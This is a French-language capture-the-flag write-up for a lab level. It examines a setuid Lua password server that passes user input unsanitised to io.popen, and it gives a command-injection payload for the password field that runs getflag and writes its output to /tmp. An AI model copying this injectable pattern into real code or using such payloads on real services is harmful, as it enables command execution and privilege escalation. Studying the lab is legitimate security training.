# Level11

Premiere étape de recherche

	$ ls -la
	-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua

On trouve un script lua

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

```

C'est un programme qui ouvre une connexion et attends un password pour le comparer avec celui hashé
Il utilise la fonction "io.popen" pour la fonction de hash. Cette fonction permet d'executer des programmes. Le programme s'en sert pour executer une commande

`io.popen("echo "..pass.." | sha1sum", "r")`

Il execute un echo + le mdp reçu pipé avec sha1sum pour obtenir le hash

On test sa connexion avec netcat

	$ nc localhost 5151
	Password:

Il attend bien le mot de passe

On peut injecter des commandes a executer pour completer sa commande directement dans le mot de passe :

`$(getflag) > /tmp/coucou; chmod 777 /tmp/coucou; echo coucou`

Le flag se trouve donc dans le fichier "/tmp/coucou"
